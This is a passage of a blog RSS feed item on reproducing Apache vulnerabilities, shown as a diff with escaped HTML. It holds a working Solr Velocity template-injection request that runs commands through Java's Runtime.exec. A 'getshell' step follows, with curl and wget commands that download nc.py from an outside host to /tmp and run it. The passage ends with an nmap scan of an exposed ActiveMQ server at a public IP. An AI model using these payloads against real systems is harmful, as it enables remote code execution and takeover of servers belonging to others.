-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;solr/bin4xin/select?wt&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;velocity&amp;amp;v.template&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;custom&amp;amp;v.template.custom&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%27%27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;.class.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27java.lang.Runtime%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;.class.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27java.lang.Character%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;.class.forName&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27java.lang.String%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27pwd%27&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;+&lt;span class=&quot;nv&quot;&gt;$ex&lt;/span&gt;.waitFor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;+%23set&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ex&lt;/span&gt;.getInputStream&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;+%23foreach&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;+in+[1..&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;.available&lt;span class=&quot;o&quot;&gt;()])&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;.valueOf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$chr&lt;/span&gt;.toChars&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$out&lt;/span&gt;.read&lt;span class=&quot;o&quot;&gt;()))&lt;/span&gt;%23end
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;getshell:&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27curl%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py%27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-
-wget%20-o%20/tmp/nc.py%20http://www.chihou.pro:8000/nc.py
-
-&lt;span class=&quot;nv&quot;&gt;$rt&lt;/span&gt;.getRuntime&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;.exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%27python%20/tmp/nc.py%27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;不过一般如果存在基本认证，就需要先过认证才行。&lt;/p&gt;
-
-&lt;h2 id=&quot;apache-activemq-vuln&quot;&gt;Apache ActiveMQ-vuln&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;探测&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;39.99.161.182
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.095s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT     STATE SERVICE VERSION
-8161/tcp open  http    Jetty 8.1.16.v20140903
-|_http-server-header: Jetty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.1.16.v20140903&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Apache ActiveMQ
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Sat, 22 Aug 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/2020/Apache/vuln-Cve/</link>
-        <guid isPermaLink="true">/blog/2020/Apache/vuln-Cve/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>笔记</category>
-        
-        <category>vulnhub</category>
-        
-        <category>CVE</category>
-        
-        <category>漏洞复现</category>
         
       </item>
     
